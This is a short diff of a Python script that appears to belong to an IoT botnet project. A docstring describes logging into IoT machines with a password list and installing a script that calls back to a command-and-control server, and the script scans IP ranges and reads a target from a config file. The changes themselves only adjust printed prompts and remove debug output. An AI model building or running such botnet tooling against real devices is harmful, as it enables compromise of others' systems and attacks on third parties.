@@ -12,8 +12,6 @@ listofopenipaddresses = list()
 mutex = threading.Lock()
 searchdone = False
 
-print('working directory = ', os.getcwd())
-
 def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
 	"""
 	This function will connect to Iot VM and install a script which will connect back to the CNC server
@@ -76,8 +74,9 @@ def findtargets():
 
 IP_RANGE = ' '
 TARGET = ' '
-
-input_choice = raw_input("1 = Search for IP addresses within a range \n 2 = Manually enter bots ip addresses")
+print("Please choose an option (1 or 2)")
+print("1 = Search for IP addresses within a range \n2 = Manually enter bots ip addresses")
+input_choice = raw_input()
 
 with open('Config.txt', 'r') as file:
 	content = file.readlines()
@@ -87,9 +86,6 @@ with open('Config.txt', 'r') as file:
 	line = content[0]
 	TARGET = line[16:]
 	TARGET = TARGET.rstrip()
-
-print('IP RANGE  = ', IP_RANGE)
-print('TARGET =', TARGET)
 
 
 if int(input_choice) == 1:
